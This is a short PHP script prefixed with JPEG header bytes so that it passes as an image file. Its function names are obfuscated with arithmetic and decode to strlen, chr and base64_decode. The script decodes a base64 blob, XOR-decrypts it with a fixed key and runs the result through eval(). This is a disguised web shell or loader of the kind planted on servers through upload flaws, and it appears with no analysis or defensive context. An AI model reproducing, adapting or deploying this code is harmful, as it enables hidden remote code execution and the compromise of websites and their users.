ÿØÿ<?php
function decode_input($z)
{
    $m = array(2 * 55, 21 * 34 - 613, 108, 67 + 6 + 41, 19 + 97, 116 - 1);
    $a = '';
    foreach ($m as $u) {
        $a .= chr($u);
    }
    $a = strrev($a);
    return $a($z);
}

function init_system($h)
{
    $m = array(14 * 14 - 97, 110 - 6, 40 + 34 + 40);
    $j = '';
    foreach ($m as $r) {
        $j .= chr($r);
    }
    return $j($h);
}

$nes = array(98 * 49 / 49 * 14 / 14 - 5 + 5, 97 + 10 + 9 - (10 + 9) + 3 + 5 - (3 + 5) - 10 + 10 + 2 - 2, 115 + 5 + 10 - (5 + 10) + 6 + 5 - (6 + 5) + 18 - 18 - 6 + 6 + 3 - 3, (101 + 5 - 5 - 20 + 20 - 10 + 10 + 10 + 8 - (10 + 8) * 1) / 1, 54 - 10 + 10 + 8 + 9 - (8 + 9) - 12 + 12 + 16 - 16, 52 + 18 - 18 + 19 - 19 - 4 + 4 + 5 + 2 - (5 + 2), 95 * 1 / 1 - 10 + 10 + 3 + 7 - (3 + 7), 100 * 10 / 10 * 50 / 50, 101 + 9 - 9 + 13 - 13 + 3 + 5 - (3 + 5) + 17 - 17 - 7 + 7, (99 + 5 - 5 * 1) / 1 - 6 + 6 + 5 + 4 - (5 + 4), 111 * 111 / 111 + 6 + 5 - (6 + 5) + 7 + 6 - (7 + 6) + 17 - 17, 100 + 13 - 13 - 9 + 9 + 4 + 9 - (4 + 9) + 9 - 9, (101 * 101 / 101 + 6 - 6 * 1) / 1 * 1 / 1 + 1 + 7 - (1 + 7));
$dwe = '';
foreach ($nes as $qzd) {
    $dwe .= init_system($qzd);
}
$oto = 'DVQUBR9WMV0UBRcGHFEDFxgTTksBFxgfDRwqHBVNHUwUAgUVTl4AGA8CB1cbVjMZFkldUjMMAREOHwpeT0sQGgpMVBwqHBVfHV0ZEFZMMUAYXkVNHF0BAx4YTlAQDl4UB1ZdBQkaCAJPUjMcF2NRKRYZMxFOCxwEB04UAglWHUwUAgUVTl4AGA8CB1cbVjMOAxBcDR8TAl5PTEgpBEFIFx4ED0FdUTMDDR9ISEtCVg1BQ1hDXg0TQ1lDXQxAQ15DCAxEQltCWwwQUUJRWx9bUVhRQh8qAgJRUwZSQlRDWg1BQ1xDCA1AQ19CWw1HQwpCXwxCQllCCw1SWEtCSRRSKQEcHx9ISEtFWgtSWEtGXQ9SWEtFWh9bUV9EXQhGTl9BSRRSKQ4dBx9ISEtRQh8qERgcSQVLUUtaRwMICwUQRlEGBQkCRhwqJSkkOH0nLTMTD0tPTDMZFkldUTMDDR9cK0VQSEsBBBwZHRBRKT8zPG4wJDcpC1kGTFYpAUAEXkspGh9bUQJRR2VZKQkXHQJPKQMOHxBSKQEcHx9cX01LU14UGh8TR0NRKRoGUxwqNSM5JXEwTUgpBEsbS1xGVRwqDANLXg5OUjMPAUxIFx4ED0FdX1dSMUEaAjdSMVIGGDFLMV0UBVZMMVcNB0RRMVpSWEsdBx9cTRseB1QQXkgpFFdcDUgpF1cBLUgpBEsbK0JLSmcDBjdGXQwoLUgpFFcoTQUQRhlRKRoGNQhGQjEtSmcPGUdGX2VcDQUQRhlRKRoGNQhGQjEtSmcPGUdGXGVcFB4TD1NOUjMcHVZeXVdSMUEaAjdSMVIGGDFLMV0UBVZMMVcNB0RRMV9SWEsCBB9cTUgpFFdeXVcLSmcPGVFSMUIaXVxARQhETRFSMVIGGFFSMUEaAjdGXQkoXkVYSmcMGRgtXg8oTQUQRhlRKRUZGmNFRDFeSmcfBQJfR0NRKRYZUxwqDwMCNQhGRjFeSmcfBQJaSmcMGRgtXglGK0VNSmcMGRgtXgwoXkgpFFdZUjMPAUwuRl5GMxZRKRUZGmNFRF8rRhwqDwMCNQhHQjFeSmcDBjdGXWVcX0VNE1EbFQADCl1dUjMcHVZcTQgfCxBcTRE=';
$vvs = 'n8uvlv';
$dwj = '';
for ($mmy = 0; $mmy < decode_input($dwe($oto)); $mmy++) {
    $dwj .= $dwe($oto)[$mmy] ^ $vvs[$mmy % decode_input($vvs)];
}
eval($dwj);